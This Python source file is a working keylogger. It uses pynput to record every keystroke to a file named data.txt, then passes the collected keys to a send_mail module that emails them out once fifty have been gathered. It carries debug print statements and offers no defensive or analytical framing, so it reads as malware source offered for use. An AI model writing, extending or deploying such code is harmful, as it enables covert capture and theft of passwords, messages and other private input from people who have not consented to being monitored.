from pynput import keyboard
import send_mail


def get_keys_rb():
    with open('data.txt', 'rb') as file:
        text = file.read()
    return text


def get_keys():
    with open('data.txt', 'r') as file:
        text = file.read()
    return text


def add_keys(key: str):
    keys = get_keys()
    with open('data.txt', 'w') as file:
        # Add a space as a delimiter after each key
        file.write(f'{keys}{key} ')


def on_press(key):
    try:
        key_name = key.char
    except AttributeError:
        key_name = key.name
    add_keys(key_name)
    return False


def main():
    print("Checking if `open` function is intact...")
    print(open)  # Debug: Ensure `open` is not overridden

    # Create or clear the data file
    try:
        with open('data.txt', 'w') as file:
            file.write('')
    except Exception as e:
        print(f"Error in opening/clearing data.txt: {e}")
        return

    while True:
        try:
            keys = get_keys()
            print(f"Keys: {keys}")  # Debug: Check content of keys
            print(f"Keys Type: {type(keys)}")  # Debug: Check type of keys

            if not isinstance(keys, str):
                raise ValueError("Expected a string from get_keys(), but got something else.")

            length = len(keys.split())  # Count words based on whitespace
            print(f"Length of keys: {length}")  # Debug: Check calculated length

            if length < 50:
                listener = keyboard.Listener(on_press=on_press)
                listener.start()
                listener.join()
            else:
                print("Sending email...")
                send_mail.send_email(keys)
                break  # Exit the loop after sending email

        except Exception as e:
            print(f"Error in main loop: {e}")
            break


if __name__ == '__main__':
    main()
